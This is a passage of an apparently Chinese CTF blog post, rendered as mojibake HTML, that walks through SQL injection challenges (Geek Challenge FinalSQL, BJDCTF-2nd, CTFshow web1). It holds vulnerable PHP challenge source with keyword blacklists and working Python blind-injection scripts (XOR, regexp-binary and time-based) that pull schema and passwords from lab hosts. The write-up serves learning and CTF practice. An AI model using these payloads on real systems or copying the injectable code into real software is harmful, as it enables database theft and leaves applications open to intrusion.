class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$dbuser</span><span class="token punctuation">,</span><span class="token variable">$dbpass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">,</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error Occured When Fetch Result."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SQL Injection Checked."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><h3 id="æå®¢å¤§æŒ‘æˆ˜â€”FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜â€”FinalSQL" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜â€”FinalSQL"></a>æå®¢å¤§æŒ‘æˆ˜â€”FinalSQL</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“å¼‚æˆ–æ³¨å…¥ï¼Œç›²æ³¨çˆ†ç ´</p><p>åœ¨ç”¨æˆ·åå’Œå¯†ç å¯†ç å¤„å°è¯•æ³¨å…¥ï¼Œå‘ç°ç»å¤§å¤šæ•°çš„å­—ç¬¦éƒ½è¢«è¿‡æ»¤ï¼Œäºæ˜¯æ‰¾åˆ°å¦ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼ŒæŠŠæ³¨é‡Šåˆ æ‰ååœ¨ç•Œé¢ä¼ å‚å›è½¦åè§‚å¯ŸURLçš„å˜åŒ–ï¼Œä¼ äº†ä¸€ä¸ªidå‚æ•°ï¼Œæ•…å°è¯•åœ¨URLä¸­çš„idå¤„æ³¨å…¥</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/MK1eADvmQB6dsRu.png" style="zoom: 80%;" loading="lazy"><p>åå°è¿‡æ»¤åˆ°é™åˆ¶å­—ç¬¦çš„æ˜¾ç¤ºçš„ç•Œé¢ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/R4IgVByGQD1h6Pk.png" style="zoom:33%;" loading="lazy"><p>å½“æ³¨å…¥ä¸Šä¸€é¢˜çš„æŸ¥è¯¢æ•°æ®åº“è¯­å¥æ—¶ï¼Œå‘ç°å¯ä»¥æ³¨å…¥ï¼Œæ˜¾ç¤ºä»¥ä¸‹ç•Œé¢ï¼Œåº”è¯¥æ˜¯åå°æŠŠæŠ¥é”™çš„ç•Œé¢ç»™å¤„ç†äº†ï¼Œæ‰€ä»¥çœ‹ä¸åˆ°æ•°æ®åº“æŠ¥é”™çš„ç•Œé¢</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/yjbmJD4Ocn76fCA.png" style="zoom:33%;" loading="lazy"><p>è¿›è¡Œå¼‚æˆ–æ³¨å…¥æµ‹è¯•ï¼Œé€šè¿‡æµ‹è¯•å‘ç°ï¼Œid=1^1çš„ç»“æœå’Œid=0çš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œå½“id=1^0çš„æ—¶å€™ï¼Œç•Œé¢å°±è¿”å›äº†å½“id=1çš„æ—¶å€™çš„ç•Œé¢ï¼Œç”±æ­¤å¯ä»¥æƒ³åˆ°é€šè¿‡æ„é€ ASCIIå‡½æ•°é…åˆsubstrå‡½æ•°åˆ¤æ–­å­—ç¬¦å¤§å°ï¼Œå½“ASCIIå‡½æ•°å€¼ç­‰äºï¼ˆå±…ç„¶æ²¡è¿‡æ»¤ï¼‰åé¢çš„åè¿›åˆ¶æ—¶ï¼Œæ˜¾ç¤ºid=0çš„æ—¶å€™çš„ç•Œé¢ï¼Œå…·ä½“è„šæœ¬å’Œåˆ¤æ–­æ–¹æ³•å¦‚ä¸‹ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"æ­¤å¤„ä¸ºsqlè¯­å¥"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>å˜é‡i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>å˜é‡j<span class="token punctuation">)</span></code></pre><p>æŸ¥åº“ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek')),'"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/31rlIa5vfeoYkNF.png" alt loading="lazy"></p><p>æŸ¥è¡¨ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)='geek')),'"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/iOdeEnDWUwNK8V3.png" alt loading="lazy"></p><p>æŸ¥åˆ—ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)='F1naI1y')),'"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DTSb4nMyjg6e89R.png" alt loading="lazy"></p><p>emmmmmmmè¿™é‡Œé•¿åº¦æ²¡ç»™å¤Ÿï¼Œæ ¹æ®å‰é¢çš„ç»éªŒï¼ŒæŸ¥passwordåˆ—åº”è¯¥å°±å¯ä»¥äº†ï¼ŒF1aaaaagè¡¨ä¸­æ²¡æœ‰ä¸œè¥¿</p><p>æŸ¥å­—æ®µï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),'"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>æ‹¿åˆ°flagï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RvGOsyKqSXYNEug.png" alt loading="lazy"></p><h3 id="BJDCTF-2ndâ€”ç®€å•æ³¨å…¥"><a href="#BJDCTF-2ndâ€”ç®€å•æ³¨å…¥" class="headerlink" title="BJDCTF-2ndâ€”ç®€å•æ³¨å…¥"></a>BJDCTF-2ndâ€”ç®€å•æ³¨å…¥</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“regexp()æ­£åˆ™åŒ¹é…ï¼Œbinaryå¤§å°å†™åŒ¹é…ï¼Œå¸ƒå°”ç›²æ³¨(äº¦å¯æ—¶é—´ç›²æ³¨)</p><p>å‚è€ƒï¼š<a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/rODhM3lG8ux9Hdf.png" style="zoom:80%;" loading="lazy"><p>è¿™é¢˜çœ‹ç€ç•Œé¢æœ‰ç‚¹çœ¼ç†Ÿï¼Œè¿™è¿™ä¸ªç½‘ç«™ä¸Šæœ‰ä¸ªç±»ä¼¼çš„é¢˜<a href="http://pcat.cc/q.php">http://pcat.cc/q.php</a> ï¼ŒQuestion 5é‚£ä¸€æœŸçš„webé¢˜</p><p>å…ˆfuzzä¸€ä¸‹ï¼Œä»¥ä¸‹å­—ç¬¦è¢«è¿‡æ»¤ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/FnfpO9AMlex8UdC.png" style="zoom: 80%;" loading="lazy"><p>å‡ ä¸ªå¸¸ç”¨çš„æ³¨å…¥å‚æ•°è¢«è¿‡æ»¤ï¼š<code>&#39; &quot; select</code>ï¼Œè¿™å‡ ä¸ªå‚æ•°è¢«è¿‡æ»¤å°±å·²ç»æ€äº†å¤§éƒ¨åˆ†çš„å¯æ³¨å…¥æ–¹å¼ï¼Œäºæ˜¯æƒ³åŠæ³•æ„é€ æ³¨å…¥æ¡ä»¶ï¼Œé¢˜ç›®è§£é¢˜æ€è·¯å’ŒQuestion 5é‚£ä¸€æœŸçš„webé¢˜ç±»ä¼¼ï¼Œç›´æ¥ç»™å‡ºè§£é¢˜æ–¹æ³•</p><p>è§£é¢˜æ–¹æ³•ï¼šåœ¨ç”¨æˆ·åå¤„æ³¨å…¥åæ–œæ†<code>\</code>ï¼Œå¯ä»¥å°†åç«¯<code>sql</code>è¯­å¥å¤„<code>username</code>çš„åé¢çš„å•å¼•å·è½¬ä¹‰</p><p>æ¨æµ‹åç«¯sqlè¯­å¥å˜æˆ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username password <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'1\' and password = '</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#'</span></code></pre><p>æµ‹è¯•åå‘é¢˜ç›®ä¸‹æ–¹çš„å­—ç¬¦ä¸²æ”¹å˜äº†ï¼ˆå¯æƒœæ¯”èµ›çš„æ—¶å€™æ²¡æ³¨æ„ï¼‰ï¼Œå¯ä»¥ç”¨regexpæ­£åˆ™æ¨¡ç³ŠåŒ¹é…çš„æ–¹æ³•æ„é€ sqlæ³¨å…¥è¯­å¥æ³¨å‡º<code>admin</code>çš„<code>password</code>ï¼Œäºæ˜¯å†™<code>python</code>è„šæœ¬ç›²æ³¨</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/Vc2DsFmxGRngN4p.png" style="zoom: 80%;" loading="lazy"><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn/index.php"</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>str1 <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>passwd <span class="token operator">=</span> <span class="token string">''</span>pass1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        pass1 <span class="token operator">=</span> <span class="token string">'0x5E'</span> <span class="token operator">+</span> passwd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x5E'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">' or password regexp binary &#123;&#125;#'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>pass1<span class="token punctuation">)</span>        <span class="token comment">#print(pass1)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'1\\'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'BJD needs'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            passwd <span class="token operator">=</span> passwd <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>æ³¨æ„è¿™é‡Œ<code>binary</code>çš„ä½¿ç”¨ï¼Œæ¯”èµ›çš„æ—¶å€™å°±æ˜¯è¢«è¿™é‡Œç»™å‘äº†=.=ï¼Œmysqlé»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿™é‡Œä½¿ç”¨è¯¥å…³é”®å­—æ¥åŒºåˆ†å¤§å°å†™ï¼Œè¿˜æœ‰<code>regexp</code>å‡½æ•°å¯ä»¥åŒ¹é…åå…­è¿›åˆ¶æ•°ï¼Œæ¶¨å§¿åŠ¿äº†ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å¼•å·çš„è¿‡æ»¤ï¼Œå¦å¤–ä¸Šé¢çš„<code>Ezsqli</code>é¢˜ä¹Ÿè¿˜æœ‰ä¸€ç§åŒ¹é…å¤§å°å†™çš„æ–¹æ³•ï¼Œç”¨äº<code>in</code>è¢«è¿‡æ»¤ï¼Œ<code>binary</code>å°±ä¸å¥½ä½¿äº†</p><p>æœ€åç›²æ³¨å‡º<code>password</code>ä¸º<code>OhyOuFOuNdit</code>ç™»å½•<code>admin</code>è´¦å·å³å¯å¾—åˆ°<code>flag</code></p><p>å¦å¤–è¿˜æœ‰ä¸€ç§æ—¶é—´ç›²æ³¨çš„æ–¹æ³•ï¼š <code>or if(substr(password,1,1)regexp binary 0x5E...,sleep(3),1)</code></p><h3 id="CTFshowâ€”web1"><a href="#CTFshowâ€”web1" class="headerlink" title="CTFshowâ€”web1"></a>CTFshowâ€”web1</h3><p>è®¿é—®<code>www.zip</code>å¾—åˆ°æºç </p><p>index.phpï¼ˆç•¥ï¼‰</p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\_|\+|\=|\]|\;|\'|\â€™|\â€œ|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select pwd from user where uname = '<span class="token interpolation"><span class="token variable">$username</span></span>' limit 1"</span><span class="token punctuation">;</span><span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:/user_main.php?order=id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>reg.htmlï¼ˆç•¥ï¼‰</p><p>reg.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span 